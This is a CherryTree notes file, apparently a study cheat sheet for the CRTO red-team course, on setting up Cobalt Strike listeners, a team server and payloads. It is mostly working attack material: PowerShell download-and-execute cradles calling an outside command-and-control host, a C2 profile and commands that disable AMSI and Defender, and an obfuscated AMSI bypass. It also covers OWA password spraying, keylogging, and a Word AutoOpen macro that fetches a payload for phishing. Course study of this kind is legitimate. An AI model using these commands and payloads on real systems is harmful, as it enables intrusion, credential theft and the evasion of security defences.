<?xml version="1.0" encoding="UTF-8"?>
<cherrytree>
  <bookmarks list=""/>
  <node name="CRTO cheatsheet" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1696842769" ts_lastsave="1696845570"/>
  <node name="Listener setup" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1696845570" ts_lastsave="1697276390">
    <rich_text scale="h3" weight="heavy">http/s,smb,dns,tcp,pivot , foreign listener</rich_text>
    <rich_text>


# Set below DNS Type A &amp; NS records, where IP points to TeamServer

@    | A  | 10.10.5.50
ns1  | A  | 10.10.5.50
pics | NS | ns1.nickelviper.com

# Verify the DNS configuration from TeamServer, it should return 0.0.0.0
$ dig @ns1.nickelviper.com test.pics.nickelviper.com +short

# Use pics.nickelviper.com as DNS Host and Stager in Listener Configuration


Stager payloads will detect  and stager_host set to false

select stageless payloads

</rich_text>
    <rich_text scale="h3" background="#9a9a99999696" weight="heavy">pivot listener</rich_text>
    <rich_text scale="h3">  //   </rich_text>
    <rich_text scale="h3" weight="heavy">To create a pivot listener, right-click on a Beacon and select </rich_text>
    <rich_text style="italic" scale="h3" weight="heavy">Pivoting &gt; Listener</rich_text>
    <rich_text scale="h3" weight="heavy">. ┬áThis will open a "New Listener" window.</rich_text>
    <rich_text>

we can create a pivot listener using an existing beacon  //tcp beacons used 

we can creaate a pivot payload -→ payloads-&gt;windows stagesless -&gt;select pivot listener and downlaod


</rich_text>
    <rich_text justification="left"></rich_text>
    <rich_text>

check netstat for port 4444 bind to locally   it binds on all interfaces 0.0.0.0</rich_text>
    <encoded_png char_offset="819" justification="left" link=""></encoded_png>
    <node name="payloads" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1696845680" ts_lastsave="1696845704">
      <rich_text>Payloads of different formats can be generated from the Payloads menu.  Here's a breakdown of each option:

HTML Application

Produces a .hta file (typically delivered through a browser by way of social engineering) uses embedded VBScript to run the payload.  Only generates payloads for egress listeners and is limited to x86.

MS Office Macro

Produces a piece of VBA that can be dropped into a macro-enabled MS Word or Excel document.  Only generates payloads for egress listeners but is compatible with both x86 and x64 Office.

Stager Payload Generator

Produces a payload stager in a variety of languages including C, C#, PowerShell, Python, and VBA.  These are useful when building your own custom payloads or exploits.  Only generates payloads for egress listeners, but supports x86 and x64.

Stageless Payload Generator

As above, but generates stageless payloads rather than stagers.  It has slightly fewer output formats, e.g. no PowerShell, but has the added option of specifying an exit function (process or thread).  It can also generate payloads for P2P listeners.

Windows Stager Payload

Produces a pre-compiled stager as an EXE, Service EXE or DLL.

Windows Stageless Payload

Produces a pre-compiled stageless payload as an EXE, Service EXE, DLL, shellcode, as well as PowerShell.  This is also the only means of generating payloads for P2P listeners.

Windows Stageless Generate All Payloads

Pretty much what it says on the tin.  Produces every stageless payload variant, for every listener, in x86 and x64.


</rich_text>
      <rich_text scale="h3" weight="heavy">  Use this last option to output payloads for all your listeners to C:\Payloads.</rich_text>
      <rich_text>
  
  </rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>
  
  </rich_text>
      <encoded_png char_offset="1617" justification="left" link="webs https://files.cdn.thinkific.com/file_uploads/584845/images/e29/763/8d3/payloads.png">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</encoded_png>
    </node>
  </node>
  <node name="Doownload  &amp;  firewall" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697276390" ts_lastsave="1697276516">
    <rich_text weight="heavy"># Run a python3 webserver
$ python3 -m http.server

# Check outbound access to TeamServer
$ iwr -Uri </rich_text>
    <rich_text link="webs http://nickelviper.com/a" weight="heavy">http://nickelviper.com/a</rich_text>
    <rich_text weight="heavy">

# Change incoming firewall rules
beacon&gt; powerpick New-NetFirewallRule -DisplayName "Test Rule" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080
beacon&gt; powerpick Remove-NetFirewallRule -DisplayName "Test Rule"

## Encode the powershell payload for handling extra quotes 

# Powershell
PS C:\&gt; $str = 'IEX ((new-object net.webclient).downloadstring("</rich_text>
    <rich_text link="webs http://nickelviper.com/a" weight="heavy">http://nickelviper.com/a</rich_text>
    <rich_text weight="heavy">"))'
PS C:\&gt; [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

#Linux 
$ echo -n "IEX(New-Object Net.WebClient).downloadString('</rich_text>
    <rich_text link="webs http://10.10.14.31/shell.ps1')" weight="heavy">http://10.10.14.31/shell.ps1')</rich_text>
    <rich_text weight="heavy">" | iconv -t UTF-16LE | base64 -w 0

# Final Command
powershell -nop -enc &lt;BASE64_ENCODED_PAYLOAD&gt;
</rich_text>
  </node>
  <node name="Start the team server and run as service" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697276516" ts_lastsave="1697276551">
    <rich_text weight="heavy">
&gt; sudo ./teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile</rich_text>
    <rich_text>

</rich_text>
    <rich_text weight="heavy">$ sudo vim /etc/systemd/system/teamserver.service

[Unit]
Description=Cobalt Strike Team Server
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
WorkingDirectory=/home/attacker/cobaltstrike
ExecStart=/home/attacker/cobaltstrike/teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile

[Install]
WantedBy=multi-user.target

$ sudo systemctl daemon-reload
$ sudo systemctl status teamserver.service
$ sudo systemctl start teamserver.service</rich_text>
    <rich_text>
</rich_text>
    <rich_text weight="heavy">$ sudo systemctl enable teamserver.service</rich_text>
    <rich_text>

</rich_text>
  </node>
  <node name="Enable Hosting of Web Delivery Payloads via agscript client in headless mode" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697276583" ts_lastsave="1697276630">
    <rich_text weight="heavy">
$ cat host_payloads.cna

# Connected and ready
on ready {

    # Generate payload
    $payload = artifact_payload("http", "powershell", "x64");

    # Host payload
    site_host("10.10.5.50", 80, "/a", $payload, "text/plain", "Auto Web Delivery (PowerShell)", false);
}

# Add below command in "/etc/systemd/system/teamserver.service" file

ExecStartPost=/bin/sh -c '/usr/bin/sleep 30; /home/attacker/cobaltstrike/agscript 127.0.0.1 50050 headless Passw0rd! host_payloads.cna &amp;'
</rich_text>
  </node>
  <node name="custom c2 profile for CRTO" unique_id="7" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697276630" ts_lastsave="1697289289">
    <rich_text weight="heavy"># Custom C2 Profile for CRTO
set sample_name "Dumbledore";
set sleeptime "5000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36";
set host_stage "true";

post-ex {
        set amsi_disable "true";
	set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
	set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
}

http-get {
	set uri "/cat.gif /image /pixel.gif /logo.gif";

	client {
        	# customize client indicatorsi
		header "Accept" "text/html,image/avif,image/webp,*/*";
		header "Accept-Language" "en-US,en;q=0.5";
		header "Accept-Encoding" "gzip, deflate";
		header "Referer" "</rich_text>
    <rich_text link="webs https://www.google.com" weight="heavy">https://www.google.com</rich_text>
    <rich_text weight="heavy">";

		parameter "utm" "ISO-8898-1";
		parameter "utc" "en-US";

		metadata{
			base64;
			header "Cookie";
		}
	}

	server {
		# customize soerver indicators
		header "Content-Type" "image/gif";
		header "Server" "Microsoft IIS/10.0";	
		header "X-Powered-By" "ASP.NET";	



		output{
			prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
                        prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
                        prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
			print;
		}
	}
}

http-post {
	set uri "/submit.aspx /finish.aspx";

	client {

		header "Content-Type" "application/octet-stream";
		header "Accept" "text/html,image/avif,image/webp,*/*";
		header "Accept-Language" "en-US,en;q=0.5";
		header "Accept-Encoding" "gzip, deflate";
		header "Referer" "</rich_text>
    <rich_text link="webs https://www.google.com" weight="heavy">https://www.google.com</rich_text>
    <rich_text weight="heavy">";
		
		id{
			parameter "id";
		}

		output{
			print;
		}

	}


	server {
		# customize soerver indicators
		header "Content-Type" "text/plain";
		header "Server" "Microsoft IIS/10.0";	
		header "X-Powered-By" "ASP.NET";	

		output{
			print;
		}
	}
}

http-stager {

	server {
		header "Content-Type" "application/octet-stream";
		header "Server" "Microsoft IIS/10.0";	
		header "X-Powered-By" "ASP.NET";	
	}
}
</rich_text>
  </node>
  <node name="Defender bypass" unique_id="8" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697289289" ts_lastsave="1697289385">
    <rich_text weight="heavy">
# Compile the Artifact kit
$ ./build.sh pipe VirtualAlloc 277492 5 false false /mnt/c/Tools/cobaltstrike/artifacts

# Compile the resource kit
$ ./build.sh /mnt/c/Tools/cobaltstrike/resources

# Verify if the payload is AV Safe
PS&gt; C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\smb_x64.svc.exe
PS&gt; C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\http_x64.ps1 -e AMSI

# Load the CNA file: Cobalt Strike &gt; Script Manager &gt; Load_ and select the CNA
# Use Payloads &gt; Windows Stageless Generate All Payloads to replace all of your payloads in `C:\Payloads`

# Disable AMSI in Malleable C2 profile
$ vim c2-profiles/normal/webbug.profile

#Right above the `http-get` block, add the following:
post-ex {
        set amsi_disable "true";
}

# Verify the modified C2 profile
attacker@ubuntu ~/cobaltstrike&gt; ./c2lint c2-profiles/normal/webbug.profile

# Creating custom C2 profiles
</rich_text>
    <rich_text link="webs https://unit42.paloaltonetworks.com/cobalt-strike-malleable-c2-profile/" weight="heavy">https://unit42.paloaltonetworks.com/cobalt-strike-malleable-c2-profile/</rich_text>
    <rich_text weight="heavy">

</rich_text>
    <rich_text scale="h3" weight="heavy"># Note: `amsi_disable` only applies to `powerpick`, `execute-assembly` and `psinject`.  It **does not** apply to the powershell command.</rich_text>
    <rich_text weight="heavy">

# Behaviour Detections (change default process for fork &amp; run)
beacon&gt; spawnto x64 %windir%\sysnative\dllhost.exe
beacon&gt; spawnto x86 %windir%\syswow64\dllhost.exe

# Change the default process for psexec
beacon&gt; ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
beacon&gt; ak-settings spawnto_x86 C:\Windows\SysWOW64\dllhost.exe

# Disable Defender from local powershell session
Get-MPPreference
Set-MPPreference -DisableRealTimeMonitoring $true
Set-MPPreference -DisableIOAVProtection $true
Set-MPPreference -DisableIntrusionPreventionSystem $true

# AMSI bypass
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

</rich_text>
  </node>
  <node name="Initial foothold" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697289385" ts_lastsave="1697289509">
    <rich_text scale="h3" weight="heavy"># Identify the mail server of given domain
$ dig cyberbotic.io
$ ./dnscan.py -d cyberbotic.io -w subdomains-100.txt

# Idenitfy the NETBIOS name of target domain
ps&gt; ipmo C:\Tools\MailSniper\MailSniper.ps1
ps&gt; Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io

# Extract Employee Names (FirstName LastName) and Prepare Username List
$ ~/namemash.py names.txt &gt; possible.txt

# Validate the username to find active/real usernames
ps&gt; Invoke-UsernameHarvestOWA -ExchHostname mail.cyberbotic.io -Domain cyberbotic.io -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt

# Conduct Password Spraying attack with known Password on identified users
ps&gt; Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022

# Use Identified credentials to download Global Address List
ps&gt; Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -UserName cyberbotic.io\iyates -Password Summer2022 -OutFile .\Desktop\gal.txt</rich_text>
    <node name="Create a malicious Office file having embedded macro" unique_id="10" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="1" foreground="" ts_creation="1697289421" ts_lastsave="1697289472">
      <rich_text weight="heavy">
# Step 1: Open a blank word document "Document1". Navigate to  View &gt; Macros &gt; Create. Changes macros in to Document1. Name the default macro function as AutoOpen. Paste the below content and run for testing

Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "notepad"

End Sub


# Step 2: Generate a payload for web delivery (Attacks &gt; Scripted Web Delivery (S) and generate a 64-bit PowerShell payload with your HTTP/DNS listener). Balance the number of quotes


Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
	Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('</rich_text>
      <rich_text link="webs http://nickelviper.com/a'))" weight="heavy">http://nickelviper.com/a'))</rich_text>
      <rich_text weight="heavy">"""

End Sub

# Step 3: Save the document as .doc file and send it as phising email
</rich_text>
    </node>
  </node>
  <node name="Host Reconnaissance" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697289509" ts_lastsave="1697289547">
    <rich_text weight="heavy">
# Identify running process like AV, EDR or any monitoring and logging solution
beacon&gt; ps

# Use Seatbealt to enumerate about system
beacon&gt; execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=system

# Screenshot, Clipboard, Keylogger and User Sessions of currently logged in user
beacon&gt; screenshot
beacon&gt; clipboard
beacon&gt; net logons

beacon&gt; keylogger
beacon&gt; job
beacon&gt; jobkill 3</rich_text>
    <rich_text>

</rich_text>
  </node>
  <node name="Host Persistence (Normal + Privilleged)" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697289547" ts_lastsave="1697289697">
    <rich_text weight="heavy">
</rich_text>
    <rich_text scale="h3" weight="heavy">
# Default location for powershell
C:\windows\syswow64\windowspowershell\v1.0\powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell

# Encode the payload for handling extra quotes 

# Powershell
PS C:\&gt; $str = 'IEX ((new-object net.webclient).downloadstring("</rich_text>
    <rich_text link="webs http://nickelviper.com/a" scale="h3" weight="heavy">http://nickelviper.com/a</rich_text>
    <rich_text scale="h3" weight="heavy">"))'
